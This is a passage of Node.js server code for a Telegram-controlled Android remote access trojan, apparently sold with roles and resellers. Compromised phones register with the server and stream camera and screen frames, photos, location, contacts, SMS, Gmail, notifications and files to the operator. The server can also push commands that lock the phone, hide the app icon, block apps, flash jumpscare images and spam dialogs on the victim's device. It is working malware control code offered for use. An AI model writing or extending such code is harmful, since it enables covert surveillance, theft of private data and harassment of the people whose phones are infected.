    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'dialogSpam') {
    devices[deviceId].status.dialogSpamActive = true
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'dialogSpamStop') {
    devices[deviceId].status.dialogSpamActive = false
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'muteVolume') {
    devices[deviceId].status.volumeMuted = (value === 'true')
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'unlockDevice') {
    devices[deviceId].status.deviceLocked = false
    devices[deviceId].status.lockTitle    = ''
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'jumpscareStart') {
    devices[deviceId].status.jumpscareActive = true
    devices[deviceId].status.jumpscareUrl    = value
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'jumpscareStop') {
    devices[deviceId].status.jumpscareActive = false
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'blockApp') {
    try {
      const obj = typeof value === 'string' ? JSON.parse(value) : value
      const arr = devices[deviceId].status.blockedApps || []
      if (!arr.includes(obj.package)) arr.push(obj.package)
      devices[deviceId].status.blockedApps = arr
      broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
    } catch (_) {}
  } else if (command === 'unblockApp') {
    const arr = devices[deviceId].status.blockedApps || []
    devices[deviceId].status.blockedApps = arr.filter(p => p !== value)
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'unblockAll') {
    devices[deviceId].status.blockedApps = []
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  }

  io.to(`device:${deviceId}`).emit('command', { command, value })
  res.json({ ok: true })
})


io.on('connection', (socket) => {

  socket.on('controller:join', (data) => {
    const token = data?.token
    if (!token || !sessions[token]) {
      socket.emit('auth:error', { message: 'Unauthorized' })
      socket.disconnect()
      return
    }
    const username = sessions[token].username
    const uid = sessions[token].uid || ''
    socket.data.uid = uid

    const accounts = loadAccounts()
    const acc = accounts[username]
    socket.data.smooth = acc?.smooth || false

    controllerSockets.add(socket.id)

    const devList = acc?.smooth
      ? getDeviceListForSmooth()
      : getDeviceListForUid(uid)

    socket.emit('devices:update', devList)
  })

  socket.on('device:register', (data) => {
    const { deviceId, name, battery, charging, sdkVersion, androidVersion, uid } = data
    devices[deviceId] = {
      uid: uid || '',
      id: deviceId,
      name: name || 'Unknown Device',
      socketId: socket.id,
      connectedAt: new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      info: { battery: battery ?? -1, charging: charging ?? false, sdkVersion: sdkVersion ?? -1, androidVersion: androidVersion ?? '?' },
      status: { flashlight: false, cameraActive: false, deviceLocked: false, lockTitle: '', jumpscareActive: false, jumpscareUrl: '', blockedApps: [] }
    }
    socket.join(`device:${deviceId}`)
    broadcastToUid(uid || '', 'devices:update', getDeviceListForUid(uid || ''))

    const accounts = loadAccounts()
    const owner = Object.values(accounts).find(a => a.uid === uid)
    const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false })
    console.log(`\n╔══════════════════════════════════╗`)
    console.log(`║      NEW DEVICE CONNECTED        ║`)
    console.log(`╚══════════════════════════════════╝`)
    console.log(`  Name    : ${name || 'Unknown'}`)
    console.log(`  Owner   : ${owner ? owner.displayName : 'Unknown'}`)
    console.log(`  Battery : ${battery ?? '?'}% ${charging ? '(Charging)' : ''}`)
    console.log(`  Android : ${androidVersion ?? '?'} (SDK ${sdkVersion ?? '?'})`)
    console.log(`  ID      : ${deviceId}`)
    console.log(`  Time    : ${time}`)
    console.log(`──────────────────────────────────\n`)

    const pingInterval = setInterval(() => {
      if (devices[deviceId] && devices[deviceId].socketId === socket.id) {
        io.to(`device:${deviceId}`).emit('ping:keepalive')
      } else {
        clearInterval(pingInterval)
      }
    }, 25000)

    socket.on('disconnect', () => clearInterval(pingInterval))
  })

  socket.on('device:status', (data) => {
    const { deviceId, status } = data
    if (!devices[deviceId]) return

    if (status.installedApps) {
      broadcastToUid(devices[deviceId].uid, 'apps:list', { deviceId, apps: status.installedApps })
      delete status.installedApps
    }
    if (status.notifList) {
      broadcastToUid(devices[deviceId].uid, 'notif:list', { deviceId, list: status.notifList })
      delete status.notifList
    }
    if (status.smsList) {
      broadcastToUid(devices[deviceId].uid, 'sms:list', { deviceId, list: status.smsList })
      delete status.smsList
    }

    devices[deviceId].status   = { ...devices[deviceId].status, ...status }
    devices[deviceId].lastSeen = new Date().toISOString()
    broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))
    broadcastToUid(devices[deviceId].uid, `status:${deviceId}`, devices[deviceId].status)
  })

  socket.on('device:notif', (data) => {
    const dev = devices[data.deviceId]
    if (dev) broadcastToUid(dev.uid, 'device:notif', data)
  })

  socket.on('camera:frame', (data) => {
    const { deviceId, frame } = data
    cameraFrames[deviceId] = frame
    if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'camera:frame', { deviceId, frame })
  })

  socket.on('screen:frame', (data) => {
    const { deviceId, frame } = data
    if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'screen:frame', { deviceId, frame })
  })

  socket.on('camera:screenshot', (data) => {
    const { deviceId, frame, facing } = data
    if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'camera:screenshot', { deviceId, frame, facing })
  })

  socket.on('device:gallery', (data) => {
    const { deviceId, photos } = data
    if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'device:gallery', { deviceId, photos })
  })

  socket.on('device:location', (data) => {
    if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:location', data)
  })

  socket.on('device:contacts', (data) => {
    if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:contacts', data)
  })

  socket.on('device:gmail', (data) => {
    if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:gmail', data)
  })

  socket.on('device:themeChanged', (data) => {
    if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:themeChanged', data)
  })

  socket.on('device:phone', (data) => {
    if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:phone', data)
  })

  socket.on('device:files', (data) => {
    if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:files', data)
  })

  socket.on('device:filedata', (data) => {
    const { reqId, error, base64, mime } = data
    if (!reqId || !pendingFileDownloads[reqId]) return
    if (error) {
      pendingFileDownloads[reqId](error)
    } else {
      const buf = Buffer.from(base64, 'base64')
      pendingFileDownloads[reqId](null, buf, mime || 'application/octet-stream')
    }
  })

  socket.on('disconnect', () => {
    controllerSockets.delete(socket.id)
    const socketUid = socket.data.uid || ''
    for (const id in devices) {
      if (devices[id].socketId === socket.id) {
        const deviceUid  = devices[id].uid || socketUid
        const deviceName = devices[id].name || 'Unknown'
        const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false })
        console.log(`\n╔══════════════════════════════════╗`)
        console.log(`║      DEVICE DISCONNECTED         ║`)
        console.log(`╚══════════════════════════════════╝`)
        console.log(`  Name    : ${deviceName}`)
        console.log(`  ID      : ${id}`)
        console.log(`  Time    : ${time}`)
        console.log(`──────────────────────────────────\n`)
        delete cameraFrames[id]
        delete devices[id]
        broadcastToUid(deviceUid, 'devices:update', getDeviceListForUid(deviceUid))
        break
      }
    }
    if (socketUid) broadcastToUid(socketUid, 'devices:update', getDeviceListForUid(socketUid))
  })
})

function broadcastToControllers(event, data, uid) {
  controllerSockets.forEach(sid => {
    const s = io.sockets.sockets.get(sid)
    if (!s) return

    if (s.data.smooth) {
      if (event === 'devices:update') {
        s.emit('devices:update', getDeviceListForSmooth())
      } else {
        s.emit(event, data)
      }
      return
    }

    if (uid && s.data.uid !== uid) return
    s.emit(event, data)
  })
}

function broadcastToUid(uid, event, data) {
  broadcastToControllers(event, data, uid)
}

function getDeviceListForSmooth() {
  return Object.values(devices).map(d => ({
    id: d.id, name: d.name,
    uid: d.uid,
    connectedAt: d.connectedAt, lastSeen: d.lastSeen,
    info: d.info || {},
    status: d.status
  }))
}

function getDeviceListForUid(uid) {
  if (!uid) return []
  return Object.values(devices)
    .filter(d => d.uid === uid)
    .map(d => ({
      id: d.id, name: d.name,
      connectedAt: d.connectedAt, lastSeen: d.lastSeen,
      info: d.info || {},
      status: d.status
    }))
}

function getDeviceList() {
  return Object.values(devices).map(d => ({
    id: d.id, name: d.name,
    connectedAt: d.connectedAt, lastSeen: d.lastSeen,
    info: d.info || {},
    status: d.status
  }))
}


// -- SAFE MENU HELPER (Delete lama + Kirim baru) --
async function safeMenu(chatId, messageId, text, keyboard, thumbUrl) {
  try {
    // Edit caption + reply_markup (In-Place Edit, message tetap di tempat)
    await bot.editMessageCaption(text, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: keyboard }
    })
  } catch (e) {
    // Kalau gagal edit (misal message terlalu lama atau beda tipe), fallback ke hapus + kirim baru
    try {
      await bot.deleteMessage(chatId, messageId)
    } catch (_) {}
    await sendMenuWithThumb(chatId, text, keyboard, thumbUrl || THUMBNAIL_URL)
  }
}

// -- BUTTON HELPER (Style + Custom Emoji) --
function makeButton(text, callbackData, style, emojiId) {
  const btn = { text: text, callback_data: callbackData }
  if (style) btn.style = style
  if (emojiId) btn.icon_custom_emoji_id = String(emojiId)
  return btn
}

// NOTE: Custom emoji IDs only work if the bot uploaded them.
// For emoji from other sources, use Unicode emoji in text instead.

// Predefined emoji IDs (replace with your actual custom emoji IDs)
const EMOJI = {
  main:     '4904936030232117798',   // Main menu buttons (CREATE, ADD, DEL, LIST, DEV, VISA)
  other:    '5098265504796115765',   // Other buttons (sub-menu, control, device, etc)
  back:     '5121063440311386962'    // KEMBALI only
}

// CARA DAPETIN CUSTOM EMOJI ID:
// 1. Upload sticker pack custom emoji via @Stickers atau Bot API
// 2. Pake getStickerSet() buat dapetin list sticker + custom_emoji_id
// 3. Ambil custom_emoji_id dari response
// 4. Paste ID-nya di atas
//
// ATAU:
// 1. Kirim custom emoji ke chat pribadi
// 2. Pake getUpdates() atau webhook buat liat message.entities
// 3. Ambil custom_emoji_id dari entity type "custom_emoji"
//
// NOTE: Custom emoji cuma bisa dipake kalo bot LU yang upload.
// Emoji dari bot/orang lain gak bakal works.

// Catbox thumbnail URL (ganti dengan link thumbnail lu)
const THUMBNAIL_URL = 'https://files.catbox.moe/sj7ln5.jpg'

// Channel URL for STORAN 3K button (ganti dengan link channel lu)
const STORAN_CHANNEL_URL = 'https://t.me/NovaxApps'

// Send menu with styled buttons + thumbnail (raw request for style support)
function sendMenu(chatId, text, keyboard, thumbUrl) {
  const form = {
    chat_id: chatId,
    text: text,
    parse_mode: 'Markdown',
    reply_markup: JSON.stringify({ inline_keyboard: keyboard })
  }
  if (thumbUrl) form.thumb_url = thumbUrl
  return bot._request('sendMessage', { form })
}

// Send photo with caption + buttons (for thumbnail support)

// Edit message with styled buttons
function sendMenuWithThumb(chatId, caption, keyboard, thumbUrl) {
  const url = thumbUrl || THUMBNAIL_URL
  return bot._request('sendPhoto', {
    form: {
      chat_id: chatId,
      photo: url,
      caption: caption,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify({ inline_keyboard: keyboard })
    }
  })
}

function editMenu(chatId, messageId, text, keyboard) {
  return bot._request('editMessageText', {
    form: {
      chat_id: chatId,
      message_id: messageId,
      text: text,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify({ inline_keyboard: keyboard })
    }
  })
}

function editMenuCaption(chatId, messageId, caption, keyboard) {
  return bot._request('editMessageCaption', {
    form: {
      chat_id: chatId,
      message_id: messageId,
      caption: caption,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify({ inline_keyboard: keyboard })
    }
  })
}

// ================================================================
// ===================== BOT TELEGRAM =============================
// ================================================================

// -- MENU VISA KEYBOARD --
function getVisaMenuKeyboard(botRole, userId) {
  const keyboard = []

  // Row 1: CEK ROLE | CEK QUOTA (ijo semua)
  keyboard.push([
    makeButton('𝗖𝗘𝗞 𝗥𝗢𝗟𝗘', 'menu_visa_role', 'success', EMOJI.other),
    makeButton('𝗖𝗘𝗞 𝗤𝗨𝗢𝗧𝗔', 'menu_visa_quota', 'success', EMOJI.other)
  ])

  // Row 2: ADD VISA | DEL VISA (cuma developer & owner, ijo semua)
  if (botRole === 'developer' || isOwner(userId)) {
    keyboard.push([
      makeButton('𝗔𝗗𝗗 𝗩𝗜𝗦𝗔', 'menu_visa_add', 'success', EMOJI.other),
      makeButton('𝗗𝗘𝗟 𝗩𝗜𝗦𝗔', 'menu_visa_del', 'success', EMOJI.other)
    ])
  }

  // Row 3: KEMBALI
  keyboard.push([makeButton('𝗞𝗘𝗠𝗕𝗔𝗟𝗜', 'menu_back_main', 'danger', EMOJI.back)])

  return keyboard
}

// -- MENU KEYBOARDS --
function getMainMenuKeyboard(botRole, userId) {
  const keyboard = []

  // Row 1: CREATE MENU
  keyboard.push([
    makeButton('𝗖𝗥𝗘𝗔𝗧𝗘 𝗠𝗘𝗡𝗨', 'menu_main_cakun', 'success', EMOJI.main)
  ])

  // Row 2: ADD ROLE | DEL ROLE
  keyboard.push([
    makeButton('𝗔𝗗𝗗 𝗥𝗢𝗟𝗘', 'menu_main_addrole', 'primary', EMOJI.main),
    makeButton('𝗗𝗘𝗟 𝗥𝗢𝗟𝗘', 'menu_main_delrole', 'danger', EMOJI.main)
  ])

  // Row 3: LIST DEV | CONTROL
  keyboard.push([
    makeButton('𝗟𝗜𝗦𝗧 𝗗𝗘𝗩', 'menu_main_listdevice', 'primary', EMOJI.main),
    makeButton('𝗖𝗢𝗡𝗧𝗥𝗢𝗟', 'menu_main_controldevice', 'danger', EMOJI.main)
  ])

  // Row 4: MENU VISA
  keyboard.push([
    makeButton('𝗠𝗘𝗡𝗨 𝗩𝗜𝗦𝗔', 'menu_main_visa', 'success', EMOJI.main)
  ])

  return keyboard
}

function getCakunMenuKeyboard() {
  return [
    [makeButton('𝗞𝗘𝗠𝗕𝗔𝗟𝗜', 'menu_back_main', 'danger', EMOJI.back)]
  ]
}

function getAddRoleMenuKeyboard(botRole, userId) {
  const keyboard = []

  if (botRole === 'developer' || isOwner(userId)) {
    keyboard.push([
      makeButton('𝗔𝗗𝗗 𝗗𝗘𝗩', 'menu_adddev', 'success', EMOJI.other),
      makeButton('𝗔𝗗𝗗 𝗢𝗪𝗡', 'menu_addown', 'success', EMOJI.other)
    ])
  }

  if (botRole === 'developer' || botRole === 'owner' || isOwner(userId)) {
    keyboard.push([
      makeButton('𝗔𝗗𝗗 𝗥𝗘𝗦', 'menu_addres', 'primary', EMOJI.other)
    ])
  }

  keyboard.push([
    makeButton('𝗞𝗘𝗠𝗕𝗔𝗟𝗜', 'menu_back_main', 'danger', EMOJI.back)
  ])

  return keyboard
}

function getDelRoleMenuKeyboard(botRole, userId) {
  const keyboard = []

  keyboard.push([
    makeButton('𝗗𝗘𝗟 𝗗𝗘𝗩', 'menu_deldev', 'danger', EMOJI.other),
    makeButton('𝗗𝗘𝗟 𝗢𝗪𝗡', 'menu_delown', 'danger', EMOJI.other)
  ])
  keyboard.push([
    makeButton('𝗗𝗘𝗟 𝗥𝗘𝗦', 'menu_delres', 'danger', EMOJI.other)
  ])

  keyboard.push([
    makeButton('𝗞𝗘𝗠𝗕𝗔𝗟𝗜', 'menu_back_main', 'danger', EMOJI.back)
  ])

  return keyboard
}


// -- KEYBOARD BUAT PILIH DEVICE SEBELUM CONTROL --


function getBackButtonKeyboard() {
  return [
    [makeButton('𝗞𝗘𝗠𝗕𝗔𝗟𝗜', 'menu_back_main', 'danger', EMOJI.back)]
  ]
}


// -- STATE TRACKING BUAT CONTROL DEVICE --
const userSelectedDevices = {}

function getDeviceSelectKeyboard(userId, botRole) {
  const accounts = loadAccounts()
  const access = loadBotAccess()

  let myUid = ''
  if (!isOwner(userId) && botRole !== 'developer') {
    const myAcc = Object.values(accounts).find(a => a.createdBy === String(userId))
    if (myAcc) {
      myUid = myAcc.uid
    } else {
      const myAccess = access[String(userId)]
      if (myAccess && myAccess.uid) {
        myUid = myAccess.uid
      } else {
        const myAccByUserId = Object.values(accounts).find(a =>
          a.createdBy === String(userId)
        )
        if (myAccByUserId) myUid = myAccByUserId.uid
      }
    }
  }

  const isAllAccess = isOwner(userId) || botRole === 'developer'
  const userDevices = Object.values(devices).filter(d => {
    if (isAllAccess) return true
    return d.uid === myUid
  })

  const keyboard = []

  if (userDevices.length === 0) {
    keyboard.push([{ text: '𝗕𝗘𝗟𝗨𝗠 𝗔𝗗𝗔 𝗗𝗘𝗩𝗜𝗖𝗘', callback_data: 'noop' }])
  } else {
    userDevices.forEach(d => {
      const online = (Date.now() - new Date(d.lastSeen).getTime()) < 60000
      keyboard.push([{ text: `${online ? '🟢' : '🔴'} ${d.name}`, callback_data: `select_device_${d.id}` }])
    })
  }

  keyboard.push([{ text: '⬅️ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜', callback_data: 'menu_back_main' }])
  return keyboard
}

function getControlMenuKeyboard(deviceId) {
  return [
    [{ text: '🔒 𝗟𝗢𝗖𝗞', callback_data: 'ctrl_lock_' + deviceId }, { text: '🔓 𝗨𝗡𝗟𝗢𝗖𝗞', callback_data: 'ctrl_unlock_' + deviceId }],
    [{ text: '📸 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧', callback_data: 'ctrl_screenshot_' + deviceId }, { text: '📍 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡', callback_data: 'ctrl_location_' + deviceId }],
    [{ text: '💬 𝗚𝗘𝗧 𝗦𝗠𝗦', callback_data: 'ctrl_sms_' + deviceId }, { text: '👥 𝗖𝗢𝗡𝗧𝗔𝗖𝗧𝗦', callback_data: 'ctrl_contacts_' + deviceId }],
    [{ text: '🔦 𝗙𝗟𝗔𝗦𝗛 𝗢𝗡', callback_data: 'ctrl_flash_on_' + deviceId }, { text: '🔦 𝗙𝗟𝗔𝗦𝗛 𝗢𝗙𝗙', callback_data: 'ctrl_flash_off_' + deviceId }],
    [{ text: '🗣️ 𝗧𝗧𝗦 𝗦𝗣𝗘𝗔𝗞', callback_data: 'ctrl_tts_' + deviceId }, { text: '👻 𝗝𝗨𝗠𝗣𝗦𝗖𝗔𝗥𝗘', callback_data: 'ctrl_jumpscare_' + deviceId }],
    [{ text: '🚫 𝗕𝗟𝗢𝗖𝗞 𝗔𝗣𝗣', callback_data: 'ctrl_blockapp_' + deviceId }, { text: '👻 𝗛𝗜𝗗𝗘 𝗜𝗖𝗢𝗡', callback_data: 'ctrl_hideicon_' + deviceId }],
    [{ text: '👢 𝗞𝗜𝗖𝗞 𝗗𝗘𝗩𝗜𝗖𝗘', callback_data: 'ctrl_kick_' + deviceId }],
    [{ text: '⬅️ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜', callback_data: 'menu_back_main' }]
  ]
}

// -- /START HANDLER --
bot.onText(/^\/start/, async (msg) => {
  const chat = msg.chat.id
  const userId = msg.from.id

  const groupAdmin = await isGroupAdmin(chat, userId)
  if (!isBotAdmin(userId) && !groupAdmin) {
    return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses Bot.\n\nHubungi admin buat dapetin akses.')
  }

  const botRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')
  const keyboard = getMainMenuKeyboard(botRole, userId)

  sendMenuWithThumb(chat, `*━━  𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗡𝗢𝗩𝗔𝗫 𝗡𝗘𝗢𝗕𝗥𝗨𝗧𝗔𝗟𝗜𝗦𝗠*
━  Role: *${getBotRoleName(botRole)}*

⌗ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗢𝗽𝘁𝗶𝗼𝗻𝘀 - ( @gunturnaktido ):`, keyboard)
})

// -- CALLBACK QUERY HANDLER --
bot.on('callback_query', async (query) => {
  try {
    if (!query.message) {
      console.error('[CALLBACK] query.message is undefined')
      return bot.answerCallbackQuery(query.id, { text: '❌ Message tidak ditemukan' })
    }
    const chat = query.message.chat.id
    const userId = query.from.id
    const data = query.data
    console.log('[CALLBACK]', userId, '->', data)

    const groupAdmin = await isGroupAdmin(chat, userId)
    if (!isBotAdmin(userId) && !groupAdmin) {
      return bot.answerCallbackQuery(query.id, { text: '⛔ Ga punya akses!', show_alert: true })
    }

    const botRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')

    // -- MAIN MENU NAVIGATION --
    // -- CONTROL DEVICE --
    if (data === 'menu_main_controldevice') {
      const keyboard = getDeviceSelectKeyboard(userId, botRole)
      await safeMenu(chat, query.message.message_id, `*🎮 CONTROL DEVICE*

Pilih device yang mau dikontrol:`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- SELECT DEVICE --
    else if (data.startsWith('select_device_')) {
      const deviceId = data.replace('select_device_', '')
      const dev = devices[deviceId]

      if (!dev) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan atau sudah disconnect!', show_alert: true })
        return
      }

      const online = (Date.now() - new Date(dev.lastSeen).getTime()) < 60000
      if (!online) {
        await bot.answerCallbackQuery(query.id, { text: '⚠️ Device offline!', show_alert: true })
      }

      userSelectedDevices[userId] = deviceId

      const keyboard = getControlMenuKeyboard(deviceId)
      await safeMenu(chat, query.message.message_id, `*🎮 CONTROL DEVICE*

Device: *${dev.name}*
Status: ${online ? '🟢 Online' : '🔴 Offline'}

Pilih aksi:`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- CONTROL: LOCK DEVICE --
    else if (data.startsWith('ctrl_lock_')) {
      const deviceId = data.replace('ctrl_lock_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'lockDevice', value: JSON.stringify({ title: 'Device Locked' }) })
      devices[deviceId].status.deviceLocked = true
      devices[deviceId].status.lockTitle = 'Device Locked'

      await bot.answerCallbackQuery(query.id, { text: '🔒 Device locked!' })
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))
    }

    // -- CONTROL: UNLOCK DEVICE --
    else if (data.startsWith('ctrl_unlock_')) {
      const deviceId = data.replace('ctrl_unlock_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'unlockDevice', value: '' })
      devices[deviceId].status.deviceLocked = false
      devices[deviceId].status.lockTitle = ''

      await bot.answerCallbackQuery(query.id, { text: '🔓 Device unlocked!' })
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))
    }

    // -- CONTROL: SCREENSHOT --
    else if (data.startsWith('ctrl_screenshot_')) {
      const deviceId = data.replace('ctrl_screenshot_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'takeScreenshot', value: '' })
      await bot.answerCallbackQuery(query.id, { text: '📸 Screenshot request sent!' })
    }

    // -- CONTROL: LOCATION --
    else if (data.startsWith('ctrl_location_')) {
      const deviceId = data.replace('ctrl_location_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'getLocation', value: '' })
      await bot.answerCallbackQuery(query.id, { text: '📍 Location request sent!' })
    }

    // -- CONTROL: GET SMS --
    else if (data.startsWith('ctrl_sms_')) {
      const deviceId = data.replace('ctrl_sms_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'getSms', value: '' })
      await bot.answerCallbackQuery(query.id, { text: '💬 SMS request sent!' })
    }

    // -- CONTROL: GET CONTACTS --
    else if (data.startsWith('ctrl_contacts_')) {
      const deviceId = data.replace('ctrl_contacts_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'getContacts', value: '' })
      await bot.answerCallbackQuery(query.id, { text: '👥 Contacts request sent!' })
    }

    // -- CONTROL: FLASHLIGHT ON --
    else if (data.startsWith('ctrl_flash_on_')) {
      const deviceId = data.replace('ctrl_flash_on_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'flashlight', value: 'on' })
      devices[deviceId].status.flashlight = true
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))

      await bot.answerCallbackQuery(query.id, { text: '🔦 Flashlight ON!' })
    }

    // -- CONTROL: FLASHLIGHT OFF --
    else if (data.startsWith('ctrl_flash_off_')) {
      const deviceId = data.replace('ctrl_flash_off_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'flashlight', value: 'off' })
      devices[deviceId].status.flashlight = false
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))

      await bot.answerCallbackQuery(query.id, { text: '🔦 Flashlight OFF!' })
    }

    // -- CONTROL: TTS SPEAK --
    else if (data.startsWith('ctrl_tts_')) {
      const deviceId = data.replace('ctrl_tts_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      await bot.sendMessage(chat, `🗣️ *Ketik pesan TTS*

Format: /tts ${deviceId} <pesan>
Contoh: /tts ${deviceId} Halo ini pesan dari admin`, { parse_mode: 'Markdown' })
      await bot.answerCallbackQuery(query.id, { text: 'Ketik pesan TTS di chat!' })
    }

    // -- CONTROL: JUMPSCARE --
    else if (data.startsWith('ctrl_jumpscare_')) {
      const deviceId = data.replace('ctrl_jumpscare_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'jumpscareStart', value: 'https://files.catbox.moe/sj7ln5.jpg' })
      devices[deviceId].status.jumpscareActive = true
      devices[deviceId].status.jumpscareUrl = 'https://files.catbox.moe/5i2i3o.jpg'
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))

      await bot.answerCallbackQuery(query.id, { text: '👻 Jumpscare activated!' })
    }

    // -- CONTROL: BLOCK APP --
    else if (data.startsWith('ctrl_blockapp_')) {
      const deviceId = data.replace('ctrl_blockapp_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      await bot.sendMessage(chat, `🚫 *BLOCK APP*

Format: /blockapp ${deviceId} <package.name>
Contoh: /blockapp ${deviceId} com.whatsapp`, { parse_mode: 'Markdown' })
      await bot.answerCallbackQuery(query.id, { text: 'Ketik package name di chat!' })
    }

    // -- CONTROL: HIDE ICON --
    else if (data.startsWith('ctrl_hideicon_')) {
      const deviceId = data.replace('ctrl_hideicon_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'hideIcon', value: 'true' })
      devices[deviceId].status.iconHidden = true
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))

      await bot.answerCallbackQuery(query.id, { text: '👻 Icon hidden!' })
    }

    // -- CONTROL: KICK DEVICE --
    else if (data.startsWith('ctrl_kick_')) {
      const deviceId = data.replace('ctrl_kick_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      const socketId = devices[deviceId].socketId
      const s = io.sockets.sockets.get(socketId)
      if (s) s.disconnect(true)

      const deviceName = devices[deviceId].name
      const deviceUid = devices[deviceId].uid

      delete cameraFrames[deviceId]
      delete devices[deviceId]

      broadcastToUid(deviceUid, 'devices:update', getDeviceListForUid(deviceUid))

      await bot.answerCallbackQuery(query.id, { text: `👢 ${deviceName} kicked!` })

      const keyboard = getDeviceSelectKeyboard(userId, botRole)
      await safeMenu(chat, query.message.message_id, `*🎮 CONTROL DEVICE*

Pilih device yang mau dikontrol:`, keyboard, THUMBNAIL_URL)
    }

    if (data === 'menu_back_main') {
